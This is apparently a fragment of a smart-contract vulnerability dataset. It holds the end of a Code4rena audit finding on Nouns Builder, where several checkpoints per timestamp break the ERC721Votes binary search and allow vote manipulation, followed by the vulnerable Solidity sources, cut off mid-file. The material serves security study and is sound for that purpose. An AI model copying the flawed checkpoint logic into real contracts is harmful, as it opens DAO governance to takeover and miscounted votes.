proposal.timeCreated).\n\ngovernance/governor/Governor.sol#L275(https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L275)\n\nsolidity\nweight = getVotes(_voter, proposal.timeCreated);\n\n\ngetVotes calls ERC721.getPastVotes internally:\n\ngovernance/governor/Governor.sol#L462(https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L462)\n\nsolidity\nfunction getVotes(address _account, uint256 _timestamp) public view returns (uint256) {\n    return settings.token.getPastVotes(_account, _timestamp);\n}\n\n\nERC721.getPastVotes(..., 1) tries to find the checkpoint within the while loop:\n\n| # Iteration | low | middle | high |\n| ----------| ----| -------| -----|\n| 0           | 0     | 2        | 4      |\n\nThe middle checkpoint with index 2 matches the given timestamp 1 and returns 0 votes. This is incorrect, as Bob has 2 votes. Bob is not able to vote properly.\n\n*(Please be aware that this is just one of many examples of how this issue can lead to incorrect vote accounting. In other cases, NFT owners could have more voting power than they are entitled to)*\n\n\nConsider batching multiple checkpoints writes per block/timestamp similar to how NounsDAO records checkpoints.\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/185#issuecomment-1258049019):\n  The Warden has shown how the checkpoint math can be gamed, opening up governance to flashloan exploits, infinite voting power and overall breaking all of governance quorum and execution thresholds.\n \n Because any attacker can spam create checkpoints, to manipulate the result of the Binary Search, they can manipulate their balance to make the Governor think it's way higher than intended.\n \n Mitigation requires ensuring that the only balance recorded for a block is the latest value (end of flashloan so the balance goes back down).\n \n Because the finding breaks accounting, allowing governance takeover, and the invariants of ERC721Votes are broken (votes are not what they are), I agree with High Severity.\n\nkulkarohan (Nouns Builder) confirmed(https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/185)\n\n\n\n*\n\n\n",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport { IERC721 } from \"./IERC721.sol\";\nimport { IEIP712 } from \"./IEIP712.sol\";\n\n/// @title IERC721Votes\n/// @author Rohan Kulkarni\n/// @notice The external ERC721Votes events, errors, and functions\ninterface IERC721Votes is IERC721, IEIP712 {\n    ///                                                          ///\n    ///                            EVENTS                        ///\n    ///                                                          ///\n\n    /// @notice Emitted when an account changes their delegate\n    event DelegateChanged(address indexed delegator, address indexed from, address indexed to);\n\n    /// @notice Emitted when a delegate's number of votes is updated\n    event DelegateVotesChanged(address indexed delegate, uint256 prevTotalVotes, uint256 newTotalVotes);\n\n    ///                                                          ///\n    ///                            ERRORS                        ///\n    ///                                                          ///\n\n    /// @dev Reverts if the timestamp provided isn't in the past\n    error INVALID_TIMESTAMP();\n\n    ///                                                          ///\n    ///                            STRUCTS                       ///\n    ///                                                          ///\n\n    /// @notice The checkpoint data type\n    /// @param timestamp The recorded timestamp\n    /// @param votes The voting weight\n    struct Checkpoint {\n        uint64 timestamp;\n        uint192 votes;\n    }\n\n    ///                                                          ///\n    ///                           FUNCTIONS                      ///\n    ///                                                          ///\n\n    /// @notice The current number of votes for an account\n    /// @param account The account address\n    function getVotes(address account) external view returns (uint256);\n\n    /// @notice The number of votes for an account at a past timestamp\n    /// @param account The account address\n    /// @param timestamp The past timestamp\n    function getPastVotes(address account, uint256 timestamp) external view returns (uint256);\n\n    /// @notice The delegate for an account\n    /// @param account The account address\n    function delegates(address account) external view returns (address);\n\n    /// @notice Delegates votes to an account\n    /// @param to The address delegating votes to\n    function delegate(address to) external;\n\n    /// @notice Delegates votes from a signer to an account\n    /// @param from The address delegating votes from\n    /// @param to The address delegating votes to\n    /// @param deadline The signature deadline\n    /// @param v The 129th byte and chain id of the signature\n    /// @param r The first 64 bytes of the signature\n    /// @param s Bytes 64-128 of the signature\n    function delegateBySig(\n        address from,\n        address to,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport { IERC721Votes } from \"../interfaces/IERC721Votes.sol\";\nimport { ERC721 } from \"../token/ERC721.sol\";\nimport { EIP712 } from \"../utils/EIP712.sol\";\n\n/// @title ERC721Votes\n/// @author Rohan Kulkarni\n/// @notice Modified from OpenZeppelin Contracts v4.7.3 (token/ERC721/extensions/draft-ERC721Votes.sol) & Nouns DAO ERC721Checkpointable.sol commit 2cbe6c7 - licensed under the BSD-3-Clause license.\n/// - Uses custom errors defined in IERC721Votes\n/// - Checkpoints are based on timestamps instead of block numbers\n/// - Tokens are self-delegated by default\n/// - The total number of votes is the token supply itself\nabstract contract ERC721Votes is IERC721Votes, EIP712, ERC721 {\n    ///                                                          ///\n    ///                          CONSTANTS                       ///\n    ///                                                          ///\n\n    /// @dev The EIP-712 typehash to delegate with a signature\n    bytes32 internal constant DELEGATION_TYPEHASH = keccak256(\"Delegation(address from,address to,uint256 nonce,uint256 deadline)\");\n\n    ///                                                          ///\n    ///                           STORAGE                        ///\n    ///                                                          ///\n\n    /// @notice The delegate for an account\n    /// @notice Account => Delegate\n    mapping(address => address) internal delegation;\n\n    /// @notice The number of checkpoints for an account\n    /// @dev Account => Num Checkpoints\n    mapping(address => uint256) internal numCheckpoints;\n\n    /// @notice The checkpoint for an account\n    /// @dev Account => Checkpoint Id => Checkpoint\n    mapping(address => mapping(uint256 => Checkpoint)) internal checkpoints;\n\n    ///                                                          ///\n    ///                        VOTING WEIGHT                     ///\n    ///                                                          ///\n\n    /// @notice The current number of votes for an account\n    /// @param _account The account address\n    function getVotes(address _account) public view returns (uint256) {\n        // Get the account's number of checkpoints\n        uint256 nCheckpoints = numCheckpoints[_account];\n\n        // Cannot underflow as `nCheckpoints` is ensured to be greater than 0 if reached\n        unchecked {\n            // Return the number of votes at the latest checkpoint if applicable\n            return nCheckpoints != 0 ? checkpoints[_account][nCheckpoints - 1].votes : 0;\n        }\n    }\n\n    /// @notice The number of votes for an account at a past timestamp\n    /// @param _account The account address\n    /// @param _timestamp The past timestamp\n    function getPastVotes(address _account, uint256 _timestamp) public view returns (uint256) {\n        // Ensure the given timestamp is in the past\n        if (_timestamp >= block.timestamp) revert INVALID_TIMESTAMP();\n\n        // Get the account's number of checkpoints\n        uint256 nCheckpoints = numCheckpoints[_account];\n\n        // If there are none return 0\n        if (nCheckpoints == 0) return 0;\n\n        // Get the account's checkpoints\n        mapping(uint256 => Checkpoint) storage accountCheckpoints = checkpoints[_account];\n\n        unchecked {\n            // Get the latest checkpoint id\n            // Cannot underflow as `nCheckpoints` is ensured to be greater than 0\n            uint256 lastCheckpoint = nCheckpoints - 1;\n\n            // If the latest checkpoint has a valid timestamp, return its number of votes\n            if (accountCheckpoints[lastCheckpoint].timestamp <= _timestamp) return accountCheckpoints[lastCheckpoint].votes;\n\n            // If the first checkpoint doesn't have a valid timestamp, return 0\n            if (accountCheckpoints[0].timestamp > _timestamp) return 0;\n\n            // Otherwise, find a checkpoint with a valid timestamp\n            // Use the latest id as the initial upper bound\n            uint256 high = lastCheckpoint;\n            uint256 low;\n            uint256 middle;\n\n            // Used to temporarily hold a checkpoint\n            Checkpoint memory cp;\n\n            // While a valid checkpoint is to be found:\n            while (high > low) {\n                // Find the id of the middle checkpoint\n                middle = high - (high - low) / 2;\n\n                // Get the middle checkpoint\n                cp = accountCheckpoints[middle];\n\n                // If the timestamp is a match:\n                if (cp.timestamp == _timestamp) {\n                    // Return the voting weight\n                    return cp.votes;\n\n                    // Else if the timestamp is before the one looking for:\n                } else if (cp.timestamp < _timestamp) {\n                    // Update the lower bound\n                    low = middle;\n\n                    // Else update the upper bound\n                } else {\n                    high = middle - 1;\n                }\n            }\n\n            return accountCheckpoints[low].votes;\n        }\n    }\n\n    ///                                                          ///\n    ///                          DELEGATION                      ///\n    ///                                                          ///\n\n    /// @notice The delegate for an account\n    /// @param _account The account address\n    function delegates(address _account) external view returns (address) {\n        address current = delegation[_account];\n        return current == address(0) ? _account : current;\n    }\n\n    /// @notice Delegates votes to an account\n    /// @param _to The address delegating votes to\n    function delegate(address _to) external {\n        _delegate(msg.sender, _to);\n    }\n\n    /// @notice Delegates votes from a signer to an account\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    /// @param _deadline The signature deadline\n    /// @param _v The 129th byte and chain id of the signature\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function delegateBySig(\n        address _from,\n        address _to,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external {\n        // Ensure the signature has not expired\n        if (block.timestamp > _deadline) revert EXPIRED_SIGNATURE();\n\n        // Used to store the digest\n        bytes32 digest;\n\n        // Cannot realistically overflow\n        unchecked {\n            // Compute the hash of the domain seperator with the typed delegation data\n            digest = keccak256(\n                abi.encodePacked(\"\\x19\\x01\", DOMAIN_SEPARATOR(), keccak256(abi.encode(DELEGATION_TYPEHASH, _from, _to, nonces[_from]++, _deadline)))\n            );\n        }\n\n        // Recover the message signer\n        address recoveredAddress = ecrecover(digest, _v, _r, _s);\n\n        // Ensure the recovered signer is the voter\n        if (recoveredAddress == address(0) || recoveredAddress != _from) revert INVALID_SIGNATURE();\n\n        // Update the delegate\n        _delegate(_from, _to);\n    }\n\n    /// @dev Updates delegate addresses\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    function _delegate(address _from, address _to) internal {\n        // Get the previous delegate\n        address prevDelegate = delegation[_from];\n\n        // Store the new delegate\n        delegation[_from] = _to;\n\n        emit DelegateChanged(_from, prevDelegate, _to);\n\n        // Transfer voting weight from the previous delegate to the new delegate\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n    }\n\n    /// @dev Transfers voting weight\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    /// @param _amount The number of votes delegating\n    function _moveDelegateVotes(\n        address _from,\n        address _to,\n        uint256 _amount\n    ) internal {\n        unchecked {\n            // If voting weight is being transferred:\n            if (_from != _to && _amount > 0) {\n                // If this isn't a token mint:\n                if (_from != address(0)) {\n                    // Get the sender's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_from]++;\n\n                    // Used to store the sender's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the sender's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);\n                }\n\n                // If this isn't a token burn:\n                if (_to != address(0)) {\n                    // Get the recipients's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_to]++;\n\n                    // Used to store the recipient's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the recipient's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints - 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);\n                }\n            }\n        }\n    }\n\n    /// @dev Records a checkpoint\n    /// @param _account The account address\n    /// @param _id The checkpoint id\n    /// @param _prevTotalVotes The account's previous voting weight\n    /// @param _newTotalVotes The account's new voting weight\n    function _writeCheckpoint(\n        address _account,\n        uint256 _id,\n        uint256 _prevTotalVotes,\n        uint256 _newTotalVotes\n    ) private {\n        // Get the pointer to store the checkpoint\n        Checkpoint storage checkpoint = checkpoints[_account][_id];\n\n        // Record the updated voting weight and current time\n        checkpoint.votes = uint192(_newTotalVotes);\n        checkpoint.timestamp = uint64(block.timestamp);\n\n        emit DelegateVotesChanged(_account, _prevTotalVotes, _newTotalVotes);\n    }\n\n    /// @dev Enables each NFT to equal 1 vote\n    /// @param _from The token sender\n    /// @param _to The token recipient\n    /// @param _tokenId The ERC-721 token id\n    function _afterTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) internal override {\n        // Transfer 1 vote from the sender to the recipient\n        _moveDelegateVotes(_from, _to, 1);\n\n        super._afterTokenTransfer(_from, _to, _tokenId);\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\n/// @title IERC721\n/// @author Rohan Kulkarni\n/// @notice The external ERC721 events, errors, and functions\ninterface IERC721 {\n    ///                                                          ///\n    ///                            EVENTS                        ///\n    ///                                                          ///\n\n    /// @notice Emitted when a token is transferred from sender to recipient\n    /// @param from The sender address\n    /// @param to The recipient address\n    /// @param tokenId The ERC-721 token id\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\n\n    /// @notice Emitted when an owner approves an account to manage a token\n    /// @param owner The owner address\n    /// @param approved The account address\n    /// @param tokenId The ERC-721 token id\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\n\n    /// @notice Emitted when an owner sets an approval for a spender to manage all tokens\n    /// @param owner The owner address\n    /// @param operator The spender address\n    /// @param approved If the approval is being set or removed\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n\n    ///                                                          ///\n    ///                            ERRORS                        ///\n    ///                                                          ///\n\n    /// @dev Reverts if a caller is not authorized to approve or transfer a token\n    error INVALID_APPROVAL();\n\n    /// @dev Reverts if a transfer is called with the incorrect token owner\n    error INVALID_OWNER();\n\n    /// @dev Reverts if a transfer is attempted to address(0)\n    error INVALID_RECIPIENT();\n\n    /// @dev Reverts if an existing token is called to be minted\n    error ALREADY_MINTED();\n\n    /// @dev Reverts if a non-existent token is called to be burned\n    error NOT_MINTED();\n\n    ///                                                          ///\n    ///                           FUNCTIONS                      ///\n    ///                                                          ///\n\n    /// @notice The number of tokens owned\n    /// @param owner The owner address\n    function balanceOf(address owner) external view returns (uint256);\n\n    /// @notice The owner of a token\n    /// @param tokenId The ERC-721 token id\n    function ownerOf(uint256 tokenId) external view returns (address);\n\n    /// @notice The account approved to manage a token\n    /// @param tokenId The ERC-721 token id\n    function getApproved(uint256 tokenId) external view returns (address);\n\n    /// @notice If an operator is authorized to manage all of an owner's tokens\n    /// @param owner The owner address\n    /// @param operator The operator address\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\n\n    /// @notice Authorizes an account to manage a token\n    /// @param to The account address\n    /// @param tokenId The ERC-721 token id\n    function approve(address to, uint256 tokenId) external;\n\n    /// @notice Authorizes an account to manage all tokens\n    /// @param operator The account address\n    /// @param approved If permission is being given or removed\n    function setApprovalForAll(address operator, bool approved) external;\n\n    /// @notice Safe transfers a token from sender to recipient with additional data\n    /// @param from The sender address\n    /// @param to The recipient address\n    /// @param tokenId The ERC-721 token id\n    /// @param data The additional data sent in the call to the recipient\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes calldata data\n    ) external;\n\n    /// @notice Safe transfers a token from sender to recipient\n    /// @param from The sender address\n    /// @param to The recipient address\n    /// @param tokenId The ERC-721 token id\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) external;\n\n    /// @notice Transfers a token from sender to recipient\n    /// @param from The sender address\n    /// @param to The recipient address\n    /// @param tokenId The ERC-721 token id\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) external;\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport { IERC721 } from \"../interfaces/IERC721.sol\";\nimport { Initializable } from \"../utils/Initializable.sol\";\nimport { ERC721TokenReceiver } from \"../utils/TokenReceiver.sol\";\nimport { Address } from \"../utils/Address.sol\";\n\n/// @title ERC721\n/// @author Rohan Kulkarni\n/// @notice Modified from OpenZeppelin Contracts v4.7.3 (token/ERC721/ERC721Upgradeable.sol)\n/// - Uses custom errors declared in IERC721\nabstract contract ERC721 is IERC721, Initializable {\n    ///                                                          ///\n    ///                            STORAGE                       ///\n    ///                                                          ///\n\n    /// @notice The token name\n    string public name;\n\n    /// @notice The token symbol\n    string public symbol;\n\n    /// @notice The token owners\n    /// @dev ERC-721 token id => Owner\n    mapping(uint256 => address) internal owners;\n\n    /// @notice The owner balances\n    /// @dev Owner => Balance\n    mapping(address => uint256) internal balances;\n\n    /// @notice The token approvals\n    /// @dev ERC-721 token id => Manager\n    mapping(uint256 => address) internal tokenApprovals;\n\n    /// @notice The balance approvals\n    /// @dev Owner => Operator => Approved\n    mapping(address => mapping(address => bool)) internal operatorApprovals;\n\n    ///                                                          ///\n    ///                           FUNCTIONS                      ///\n    ///                                                          ///\n\n    /// @dev Initializes an ERC-721 token\n    /// @param _name The ERC-721 token name\n    /// @param _symbol The ERC-721 token symbol\n    function __ERC721_init(string memory _name, string memory _symbol) internal onlyInitializing {\n        name = _name;\n        symbol = _symbol;\n    }\n\n    /// @notice The token URI\n    /// @param _tokenId The ERC-721 token id\n    function tokenURI(uint256 _tokenId) public view virtual returns (string memory) {}\n\n    /// @notice The contract URI\n    function contractURI() public view virtual returns (string memory) {}\n\n    /// @notice If the contract implements an interface\n    /// @param _interfaceId The interface id\n    function supportsInterface(bytes4 _interfaceId) external pure returns (bool) {\n        return\n            _interfaceId == 0x01ffc9a7 || // ERC165 Interface ID\n            _interfaceId == 0x80ac58cd || // ERC721 Interface ID\n            _interfaceId == 0x5b5e139f; // ERC721Metadata Interface ID\n    }\n\n    /// @notice The account approved to manage a token\n    /// @param _tokenId The ERC-721 token id\n    function getApproved(uint256 _tokenId) external view returns (address) {\n        return tokenApprovals[_tokenId];\n    }\n\n    /// @notice If an operator is authorized to manage all of an owner's tokens\n    /// @param _owner The owner address\n    /// @param _operator The operator address\n    function isApprovedForAll(address _owner, address _operator) external view returns (bool) {\n        return operatorApprovals[_owner][_operator];\n    }\n\n    /// @notice The number of tokens owned\n    /// @param _owner The owner address\n    function balanceOf(address _owner) public view returns (uint256) {\n        if (_owner == address(0)) revert ADDRESS_ZERO();\n\n        return balances[_owner];\n    }\n\n    /// @notice The owner of a token\n    /// @param _tokenId The ERC-721 token id\n    function ownerOf(uint256 _tokenId) public view returns (address) {\n        address owner = owners[_tokenId];\n\n        if (owner == address(0)) revert INVALID_OWNER();\n\n        return owner;\n    }\n\n    /// @notice Authorizes an account to manage a token\n    /// @param _to The account address\n    /// @param _tokenId The ERC-721 token id\n    function approve(address _to, uint256 _tokenId) external {\n        address owner = owners[_tokenId];\n\n        if (msg.sender != owner && !operatorApprovals[owner][msg.sender]) revert INVALID_APPROVAL();\n\n        tokenApprovals[_tokenId] = _to;\n\n        emit Approval(owner, _to, _tokenId);\n    }\n\n    /// @notice Authorizes an account to manage all tokens\n    /// @param _operator The account address\n    /// @param _approved If permission is being given or removed\n    function setApprovalForAll(address _operator, bool _approved) external {\n        operatorApprovals[msg.sender][_operator] = _approved;\n\n        emit ApprovalForAll(msg.sender, _operator, _approved);\n    }\n\n    /// @notice Transfers a token from sender to recipient\n    /// @param _from The sender address\n    /// @param _to The recipient address\n    /// @param _tokenId The ERC-721 token id\n    function transferFrom(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) public {\n        if (_from != owners[_tokenId]) revert INVALID_OWNER();\n\n        if (_to == address(0)) revert ADDRESS_ZERO();\n\n        if (msg.sender != _from && !operatorApprovals[_from][msg.sender] && msg.sender != tokenApprovals[_tokenId]) revert INVALID_APPROVAL();\n\n        _beforeTokenTransfer(_from, _to, _tokenId);\n\n        unchecked {\n            --balances[_from];\n\n            ++balances[_to];\n        }\n\n        owners[_tokenId] = _to;\n\n        delete tokenApprovals[_tokenId];\n\n        emit Transfer(_from, _to, _tokenId);\n\n        _afterTokenTransfer(_from, _to, _tokenId);\n    }\n\n    /// @notice Safe transfers a token from sender to recipient\n    /// @param _from The sender address\n    /// @param _to The recipient address\n    /// @param _tokenId The ERC-721 token id\n    function safeTransferFrom(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) external {\n        transferFrom(_from, _to, _tokenId);\n\n        if (\n            Address.isContract(_to) &&\n            ERC721TokenReceiver(_to).onERC721Received(msg.sender, _from, _tokenId, \"\") != ERC721TokenReceiver.onERC721Received.selector\n        ) revert INVALID_RECIPIENT();\n    }\n\n    /// @notice Safe transfers a token from sender to recipient with additional data\n    /// @param _from The sender address\n    /// @param _to The recipient address\n    /// @param _tokenId The ERC-721 token id\n    function safeTransferFrom(\n        address _from,\n        address _to,\n        uint256 _tokenId,\n        bytes calldata _data\n    ) external {\n        transferFrom(_from, _to, _tokenId);\n\n        if (\n            Address.isContract(_to) &&\n            ERC721TokenReceiver(_to).onERC721Received(msg.sender, _from, _tokenId, _data) != ERC721TokenReceiver.onERC721Received.selector\n        ) revert INVALID_RECIPIENT();\n    }\n\n    /// @dev Mints a token to a recipient\n    /// @param _to The recipient address\n    /// @param _tokenId The ERC-721 token id\n    function _mint(address _to, uint256 _tokenId) internal virtual {\n        if (_to == address(0)) revert ADDRESS_ZERO();\n\n        if (owners[_tokenId] != address(0)) revert ALREADY_MINTED();\n\n        _beforeTokenTransfer(address(0), _to, _tokenId);\n\n        unchecked {\n            ++balances[_to];\n        }\n\n        owners[_tokenId] = _to;\n\n        emit Transfer(address(0), _to, _tokenId);\n\n        _afterTokenTransfer(address(0), _to, _tokenId);\n    }\n\n    /// @dev Burns a token to a recipient\n    /// @param _tokenId The ERC-721 token id\n    function _burn(uint256 _tokenId) internal virtual {\n        address owner = owners[_tokenId];\n\n        if (owner == address(0)) revert NOT_MINTED();\n\n        _beforeTokenTransfer(owner, address(0), _tokenId);\n\n        unchecked {\n            --balances[owner];\n        }\n\n        delete owners[_tokenId];\n\n        delete tokenApprovals[_tokenId];\n\n        emit Transfer(owner, address(0), _tokenId);\n\n        _afterTokenTransfer(owner, address(0), _tokenId);\n    }\n\n    /// @dev Hook called before a token transfer\n    /// @param _from The sender address\n    /// @param _to The recipient address\n    /// @param _tokenId The ERC-721 token id\n    function _beforeTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) internal virtual {}\n\n    /// @dev Hook called after a token transfer\n    /// @param _from The sender address\n    /// @param _to The recipient address\n    /// @param _tokenId The ERC-721 token id\n    function _afterTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) internal virtual {}\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.15;\n\nimport { UUPS } from \"../lib/proxy/UUPS.sol\";\nimport { Ownable } from \"../lib/utils/Ownable.sol\";\nimport { ReentrancyGuard } from \"../lib/utils/ReentrancyGuard.sol\";\nimport { Pausable } from \"../lib/utils/Pausable.sol\";\nimport { SafeCast } from \"../lib/utils/SafeCast.sol\";\n\nimport { AuctionStorageV1 } from \"./storage/AuctionStorageV1.sol\";\nimport { Token } from \"../token/Token.sol\";\nimport { IManager } from \"../manager/IManager.sol\";\nimport { IAuction } from \"./IAuction.sol\";\nimport { IWETH } from \"../lib/interfaces/IWETH.sol\";\n\n/// @title Auction\n/// @author Rohan Kulkarni\n/// @notice A DAO's auction house\n/// Modified from:\n/// - NounsAuctionHouse.sol commit 2cbe6c7 - licensed under the BSD-3-Clause license.\n/// - Zora V3 ReserveAuctionCoreEth module commit 795aeca - licensed under the GPL-3.0 license.\ncontract Auction is IAuction, UUPS, Ownable, ReentrancyGuard, Pausable, AuctionStorageV1 {\n    ///                                                          ///\n    ///                          IMMUTABLES                      ///\n    ///                                                          ///\n\n    /// @notice The address of WETH\n    address private immutable WETH;\n\n    /// @notice The contract upgrade manager\n    IManager private immutable manager;\n\n    ///                                                          ///\n    ///                          CONSTRUCTOR                     ///\n    ///                                                          ///\n\n    /// @param _manager The contract upgrade manager address\n    /// @param _weth The address of WETH\n    constructor(address _manager, address _weth) payable initializer {\n        manager = IManager(_manager);\n        WETH = _weth;\n    }\n\n    ///                                                          ///\n    ///                          INITIALIZER                     ///\n    ///                                                          ///\n\n    /// @notice Initializes a DAO's auction contract\n    /// @param _token The ERC-721 token address\n    /// @param _founder The founder responsible for starting the first auction\n    /// @param _treasury The treasury address where ETH will be sent\n    /// @param _duration The duration of each auction\n    /// @param _reservePrice The reserve price of each auction\n    function initialize(\n        address _token,\n        address _founder,\n        address _treasury,\n        uint256 _duration,\n        uint256 _reservePrice\n    ) external initializer {\n        // Ensure the caller is the contract manager\n        if (msg.sender != address(manager)) revert ONLY_MANAGER();\n\n        // Initialize the reentrancy guard\n        __ReentrancyGuard_init();\n\n        // Grant initial ownership to a founder\n        __Ownable_init(_founder);\n\n        // Pause the contract until the first auction\n        __Pausable_init(true);\n\n        // Store DAO's ERC-721 token\n        token = Token(_token);\n\n        // Store the auction house settings\n        settings.duration = SafeCast.toUint40(_duration);\n        settings.reservePrice = _reservePrice;\n        settings.treasury = _treasury;\n        settings.timeBuffer = 5 minutes;\n        settings.minBidIncrement = 10;\n    }\n\n    ///                                                          ///\n    ///                          CREATE BID                      ///\n    ///                                                          ///\n\n    /// @notice Creates a bid for the current token\n    /// @param _tokenId The ERC-721 token id\n    function createBid(uint256 _tokenId) external payable nonReentrant {\n        // Get a copy of the current auction\n        Auction memory _auction = auction;\n\n        // Ensure the bid is for the current token\n        if (_auction.tokenId != _tokenId) revert INVALID_TOKEN_ID();\n\n        // Ensure the auction is still active\n        if (block.timestamp >= _auction.endTime) revert AUCTION_OVER();\n\n        // Cache the address of the highest bidder\n        address highestBidder = _auction.highestBidder;\n\n        // If this is the first bid:\n        if (highestBidder == address(0)) {\n            // Ensure the bid meets the reserve price\n            if (msg.value < settings.reservePrice) revert RESERVE_PRICE_NOT_MET();\n\n            // Else this is a subsequent bid:\n        } else {\n            // Cache the highest bid\n            uint256 highestBid = _auction.highestBid;\n\n            // Used to store the minimum bid required\n            uint256 minBid;\n\n            // Cannot realistically overflow\n            unchecked {\n                // Compute the minimum bid\n                minBid = highestBid + ((highestBid * settings.minBidIncrement) / 100);\n            }\n\n            // Ensure the incoming bid meets the minimum\n            if (msg.value < minBid) revert MINIMUM_BID_NOT_MET();\n\n            // Refund the previous bidder\n            _handleOutgoingTransfer(highestBidder, highestBid);\n        }\n\n        // Store the new highest bid\n        auction.highestBid = msg.value;\n\n        // Store the new highest bidder\n        auction.highestBidder = msg.sender;\n\n        // Used to store if the auction will be extended\n        bool extend;\n\n        // Cannot underflow as `_auction.endTime` is ensured to be greater than the current time above\n        unchecked {\n            // Compute whether the time remaining is less than the buffer\n            extend = (_auction.endTime - block.timestamp) < settings.timeBuffer;\n        }\n\n        // If the time remaining is within the buffer:\n        if (extend) {\n            // Cannot realistically overflow\n            unchecked {\n                // Extend the auction by the time buffer\n                auction.endTime = uint40(block.timestamp + settings.timeBuffer);\n            }\n        }\n\n        emit AuctionBid(_tokenId, msg.sender, msg.value, extend, auction.endTime);\n    }\n\n    ///                                                          ///\n    ///                    SETTLE & CREATE AUCTION               ///\n    ///                                                          ///\n\n    /// @notice Settles the current auction and creates the next one\n    function settleCurrentAndCreateNewAuction() external nonReentrant whenNotPaused {\n        _settleAuction();\n        _createAuction();\n    }\n\n    /// @dev Settles the current auction\n    function _settleAuction() private {\n        // Get a copy of the current auction\n        Auction memory _auction = auction;\n\n        // Ensure the auction wasn't already settled\n        if (auction.settled) revert AUCTION_SETTLED();\n\n        // Ensure the auction had started\n        if (_auction.startTime == 0) revert AUCTION_NOT_STARTED();\n\n        // Ensure the auction is over\n        if (block.timestamp < _auction.endTime) revert AUCTION_ACTIVE();\n\n        // Mark the auction as settled\n        auction.settled = true;\n\n        // If a bid was placed:\n        if (_auction.highestBidder != address(0)) {\n            // Cache the amount of the highest bid\n            uint256 highestBid = _auction.highestBid;\n\n            // If the highest bid included ETH: Transfer it to the DAO treasury\n            if (highestBid != 0) _handleOutgoingTransfer(settings.treasury, highestBid);\n\n            // Transfer the token to the highest bidder\n            token.transferFrom(address(this), _auction.highestBidder, _auction.tokenId);\n\n            // Else no bid was placed:\n        } else {\n            // Burn the token\n            token.burn(_auction.tokenId);\n        }\n\n        emit AuctionSettled(_auction.tokenId, _auction.highestBidder, _auction.highestBid);\n    }\n\n    /// @dev Creates an auction for the next token\n    function _createAuction() private {\n        // Get the next token available for bidding\n        try token.mint() returns (uint256 tokenId) {\n            // Store the token id\n            auction.tokenId = tokenId;\n\n            // Cache the current timestamp\n            uint256 startTime = block.timestamp;\n\n            // Used to store the auction end time\n            uint256 endTime;\n\n            // Cannot realistically overflow\n            unchecked {\n                // Compute the auction end time\n                endTime = startTime + settings.duration;\n            }\n\n            // Store the auction start and end time\n            auction.startTime = uint40(startTime);\n            auction.endTime = uint40(endTime);\n\n            // Reset data from the previous auction\n            auction.highestBid = 0;\n            auction.highestBidder = address(0);\n            auction.settled = false;\n\n            emit AuctionCreated(tokenId, startTime, endTime);\n\n            // Pause the contract if token minting failed\n        } catch Error(string memory) {\n            _pause();\n        }\n    }\n\n    ///                                                          ///\n    ///                             PAUSE                        ///\n    ///                                                          ///\n\n    /// @notice Unpauses the auction house\n    function unpause() external onlyOwner {\n        _unpause();\n\n        // If this is the first auction:\n        if (auction.tokenId == 0) {\n            // Transfer ownership of the contract to the DAO\n            transferOwnership(settings.treasury);\n\n            // Start the first auction\n            _createAuction();\n        }\n        // Else if the contract was paused and the previous auction was settled:\n        else if (auction.settled) {\n            // Start the next auction\n            _createAuction();\n        }\n    }\n\n    /// @notice Pauses the auction house\n    function pause() external onlyOwner {\n        _pause();\n    }\n\n    /// @notice Settles the latest auction when the contract is paused\n    function settleAuction() external nonReentrant whenPaused {\n        _settleAuction();\n    }\n\n    ///                                                          ///\n    ///                       AUCTION SETTINGS                   ///\n    ///                                                          ///\n\n    /// @notice The DAO treasury\n    function treasury() external view returns (address) {\n        return settings.treasury;\n    }\n\n    /// @notice The time duration of each auction\n    function duration() external view returns (uint256) {\n        return settings.duration;\n    }\n\n    /// @notice The reserve price 